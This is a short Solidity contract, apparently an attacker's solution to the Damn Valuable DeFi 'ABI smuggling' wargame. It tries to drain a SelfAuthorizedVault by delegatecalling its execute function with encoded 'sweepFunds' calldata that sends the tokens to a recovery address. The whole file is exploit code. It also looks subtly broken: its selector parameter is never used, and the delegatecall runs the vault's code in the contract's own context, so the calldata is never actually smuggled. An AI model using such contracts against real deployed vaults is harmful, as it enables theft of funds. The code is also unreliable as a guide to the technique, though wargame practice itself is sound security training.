// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./SelfAuthorizedVault.sol";

contract Smuggler {
    DamnValuableToken token;
    address recover;
    
    constructor (DamnValuableToken _token, address _recover) {
       token = _token;
       recover = _recover;
    }
    
    function smuggle (address target, bytes4 _selector) external {
        bytes4 selector = _selector;
        bytes memory actionData = abi.encodeWithSignature("sweepFunds(address,address)", recover, address(token));
        target.delegatecall(abi.encodeWithSignature(
            "execute(address,bytes)",
            target,
            actionData
         ));
    }
}
